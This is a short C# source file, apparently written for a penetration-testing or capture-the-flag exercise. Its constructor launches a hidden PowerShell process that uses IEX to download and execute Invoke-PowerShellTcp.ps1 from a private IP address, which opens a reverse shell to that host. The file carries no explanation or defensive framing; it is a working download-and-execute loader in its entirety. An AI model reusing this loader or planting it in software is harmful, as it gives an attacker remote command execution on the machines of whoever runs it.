using System;
using System.Diagnostics;
using System.Net;

namespace shell // <-- file name shell.cs
{
    public class Run
    {
        public Run()
        {
            var scriptUrl = "http://10.10.16.60/Invoke-PowerShellTcp.ps1";

            using (WebClient webClient = new WebClient())
            {
                // Download the PowerShell script from the URL
                string scriptContent = webClient.DownloadString(scriptUrl);

                // Modify the command to execute the script using IEX
                var processStartInfo = new ProcessStartInfo("powershell.exe")
                {
                    // Use IEX to execute the downloaded script
                    Arguments = $"IEX(New-Object Net.WebClient).DownloadString('{scriptUrl}')",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = new Process
                {
                    StartInfo = processStartInfo
                };

                process.Start();
            }
        }

        public static void Main(string[] args)
        {
            // Call the constructor to execute the script when the application starts
            new Run();
        }
    }
}

